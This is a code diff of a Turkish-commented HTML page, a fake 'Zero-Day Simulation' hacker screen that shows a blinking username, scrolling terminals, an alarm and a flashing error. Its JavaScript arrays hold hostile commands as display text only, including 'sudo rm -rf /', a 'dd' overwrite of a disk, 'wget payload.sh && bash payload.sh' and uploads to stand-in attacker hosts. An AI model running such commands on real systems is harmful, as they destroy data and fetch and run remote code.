@@ -2,59 +2,78 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Zero-Day Sim Final</title>
+  <title>Zero-Day Simulation</title>
   <style>
     body {
-      margin:0; padding:0; height:100%;
-      background:black; font-family:monospace;
+      margin:0; padding:0;
+      background:black; color:#0f0;
+      font-family:monospace;
       overflow:hidden;
     }
     #startBtn {
-      position:fixed; top:20px; right:20px;
+      position:fixed;
+      top:50%; left:50%;
+      transform:translate(-50%,-50%);
       width:80px; height:80px;
-      font-size:48px; color:#0f0;
-      border:3px solid #0f0; background:black;
-      border-radius:50%; cursor:pointer;
-      display:flex; justify-content:center; align-items:center;
+      font-size:48px;
+      color:red;
+      border:3px solid red;
+      background:black;
+      border-radius:50%;
+      cursor:pointer;
       z-index:1000;
     }
     #mhmtBox {
-      position:absolute; top:50%; left:50%;
+      position:fixed;
+      top:50%; left:50%;
       transform:translate(-50%,-50%);
-      padding:20px 40px; font-size:32px;
-      border:2px solid #0f0; color:#0f0;
-      display:none; animation:blink 1s infinite;
-      z-index:1000;
+      font-size:32px;
+      color:#0f0;
+      border:2px solid #0f0;
+      padding:20px 40px;
+      display:none;
+      animation:blink 1s infinite;
+      z-index:999;
     }
-    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.3;}}
+    @keyframes blink {
+      0%, 100% {opacity: 1;}
+      50% {opacity: 0.3;}
+    }
     .terminal {
-      position:absolute; left:5%;
-      width:90%; background:black;
-      border:2px solid white; color:#fff;
-      padding:10px; font-size:16px;
-      height:35%; overflow:auto;
-      white-space:pre-wrap; display:none;
+      position:absolute;
+      width:90%;
+      height:40%;
+      padding:10px;
+      overflow:hidden;
+      background:black;
+      border:2px solid white;
+      font-size:16px;
+      white-space:pre-wrap;
+      display:none;
       box-sizing:border-box;
     }
-    #termTop{top:0;}
-    #termBottom{bottom:0; color:#0f0;}
-    #errorMsg {
-      position:absolute; top:30%; left:50%;
-      transform:translateX(-50%);
-      color:red; font-size:64px; display:none;
+    #topTerm {top:0; left:5%; color:white;}
+    #bottomTerm {bottom:0; left:5%; color:#0f0;}
+    #errorScreen {
+      display:none;
+      position:fixed;
+      top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      font-size:48px;
+      color:red;
       animation:flash 0.5s infinite alternate;
-      z-index:2000; text-align:center;
+      z-index:9999;
     }
-    #errorImg {
-      max-width:500px;
-      width:80%;
-      margin-top:20px;
-      animation:flash 1s infinite alternate;
+    @keyframes flash {
+      0% {opacity: 1;}
+      100% {opacity: 0;}
     }
-    @keyframes flash{0%{opacity:1;}100%{opacity:0;}}
-    .excl{
-      position:absolute; color:red; font-size:32px;
-      animation:flash 0.5s infinite;
+    .excl {
+      position:absolute;
+      color:red;
+      font-size:32px;
+      animation:flash 0.3s infinite;
+      z-index:9999;
     }
   </style>
 </head>
@@ -62,84 +81,95 @@
 
 <button id="startBtn">X</button>
 <div id="mhmtBox">@mhmtxaslan</div>
-<div id="termTop" class="terminal"></div>
-<div id="termBottom" class="terminal"></div>
-<div id="errorMsg">
-  !!! ERROR !!!
-  <br>
-  <img id="errorImg" src="A_digital_image_simulating_a_hacking_terminal_scre.png" alt="Terminal Image">
-</div>
-<audio id="alarm"><source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg"></audio>
+<div id="topTerm" class="terminal"></div>
+<div id="bottomTerm" class="terminal"></div>
+<div id="errorScreen">!!! ERROR !!!</div>
+<audio id="alarm" loop>
+  <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
+</audio>
 
 <script>
-  const startBtn = document.getElementById("startBtn"),
-        mhmtBox = document.getElementById("mhmtBox"),
-        termTop = document.getElementById("termTop"),
-        termBottom = document.getElementById("termBottom"),
-        errorMsg = document.getElementById("errorMsg"),
-        alarm = document.getElementById("alarm");
+const startBtn = document.getElementById("startBtn");
+const mhmtBox = document.getElementById("mhmtBox");
+const topTerm = document.getElementById("topTerm");
+const bottomTerm = document.getElementById("bottomTerm");
+const errorScreen = document.getElementById("errorScreen");
+const alarm = document.getElementById("alarm");
 
-  startBtn.onclick = () => {
-    startBtn.style.display = "none";
-    mhmtBox.style.display = "block";
+const commands = [
+  "curl -X POST http://darkserver/upload",
+  "LongLongEarth.exe --deep-scan",
+  "sudo rm -rf / --no-preserve-root",
+  "ping 127.0.0.1 -t",
+  "nmap -sS 192.168.1.0/24",
+  "tracert 10.0.0.1",
+  "inject payload into memory",
+  "git clone http://evil.git/rootkit",
+  "dd if=/dev/random of=/dev/sda",
+  "echo HACKED > C:\\system32\\boot.ini"
+];
 
-    setTimeout(() => {
-      mhmtBox.style.color = "red";
-      mhmtBox.style.borderColor = "red";
-    },3000);
+startBtn.onclick = () => {
+  startBtn.style.display = "none";
+  mhmtBox.style.display = "block";
 
-    setTimeout(() => {
-      mhmtBox.style.display = "none";
-      termTop.style.display = "block";
-      termBottom.style.display = "block";
-      startFlow();
-    },5000);
-  };
+  // 3. saniyede renk kırmızı oluyor
+  setTimeout(() => {
+    mhmtBox.style.color = "red";
+    mhmtBox.style.borderColor = "red";
+  }, 3000);
 
-  function startFlow(){
-    const cmds = [
-      "curl http://malicious.site/payload",
-      "LongLongEarth.exe --scan port 4444",
-      "tracert 192.168.0.1",
-      "hack --user admin",
-      "sudo rm -rf /",
-      "apt-get install pwnkit",
-      "nmap -sV 10.10.10.10",
-      "wget payload.sh && bash payload.sh",
-      "ping -t 127.0.0.1",
-      "git clone https://evil.git/repo.git"
-    ];
-    let count=0, maxLines=30;
-    const loop = setInterval(()=>{
-      const cmd = cmds[Math.floor(Math.random()*cmds.length)];
-      const colorTop="#fff", colorBottom = count>15?"red":"#0f0";
-      termTop.innerHTML += `<span style="color:${colorTop}">${cmd}</span>\n`;
-      termBottom.innerHTML += `<span style="color:${colorBottom}">${cmd}</span>\n`;
-      termTop.scrollTop = termTop.scrollHeight;
-      termBottom.scrollTop = termBottom.scrollHeight;
-      count++;
-      if(count>=maxLines){
-        clearInterval(loop);
-      }
-    },300);
+  // 5. saniyede kayboluyor ve terminaller başlıyor
+  setTimeout(() => {
+    mhmtBox.style.display = "none";
+    topTerm.style.display = "block";
+    bottomTerm.style.display = "block";
+    startTerminals();
+  }, 5000);
+};
 
-    setTimeout(() => alarm.play(),10000);
-    setTimeout(() => {
-      errorMsg.style.display = "block";
-      spawnExcl(40);
-    },20000);
-  }
+function startTerminals() {
+  let count = 0;
+  const maxLines = 40;
 
-  function spawnExcl(n){
-    for(let i=0;i<n;i++){
-      const e = document.createElement("div");
-      e.className="excl";
-      e.innerText="!";
-      e.style.top=Math.random()*100+"vh";
-      e.style.left=Math.random()*100+"vw";
-      document.body.appendChild(e);
+  const terminalInterval = setInterval(() => {
+    const cmd = commands[Math.floor(Math.random()*commands.length)];
+    const color = count > 20 ? "red" : "#0f0";
+
+    topTerm.innerHTML += `<div style="color:white;">${cmd}</div>`;
+    bottomTerm.innerHTML += `<div style="color:${color};">${cmd}</div>`;
+
+    topTerm.scrollTop = topTerm.scrollHeight;
+    bottomTerm.scrollTop = bottomTerm.scrollHeight;
+
+    count++;
+    if (count >= maxLines) {
+      clearInterval(terminalInterval);
     }
+  }, 100); // yazı hızı artırıldı
+}
+
+// 20. saniyede alarm başlar
+setTimeout(() => {
+  alarm.play();
+}, 20000);
+
+// 30. saniyede ERROR ekranı ve ünlemler
+setTimeout(() => {
+  errorScreen.style.display = "block";
+  spawnExclamations(40);
+}, 30000);
+
+function spawnExclamations(num) {
+  for (let i = 0; i < num; i++) {
+    const excl = document.createElement("div");
+    excl.classList.add("excl");
+    excl.textContent = "!";
+    excl.style.top = Math.random() * 100 + "vh";
+    excl.style.left = Math.random() * 100 + "vw";
+    document.body.appendChild(excl);
   }
+}
 </script>
 
 </body>
